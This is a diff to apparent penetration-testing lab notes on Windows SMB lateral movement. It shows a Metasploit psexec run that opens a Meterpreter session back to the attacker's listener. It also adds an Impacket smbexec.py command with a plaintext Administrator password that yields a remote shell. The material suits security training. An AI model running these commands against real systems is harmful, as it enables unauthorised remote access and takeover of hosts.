@@ -45,7 +45,7 @@ Module options (exploit/windows/smb/psexec):
 
    Name                  Current Setting  Required  Description
    ----                  ---------------  --------  -----------
-   RHOSTS                demo.ine.local   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RHOSTS                example.local    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT                 445              yes       The SMB service port (TCP)
    SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
    SERVICE_DISPLAY_NAME                   no        The service display name
@@ -83,4 +83,13 @@ msf6 exploit(windows/smb/psexec) > exploit
 [*] Meterpreter session 6 opened (10.10.22.2:4444 -> 10.4.27.211:49790 ) at 2023-08-28 04:49:53 +0530
 
 meterpreter >
+```
+### smbexec.py
+smbexec.py
+```
+root@attackdefense:~# smbexec.py Administrator:'abc_123321!@#'@example.local
+Impacket v0.9.25.dev1+20220131.200424.badf09d - Copyright 2021 SecureAuth Corporation
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
 ```
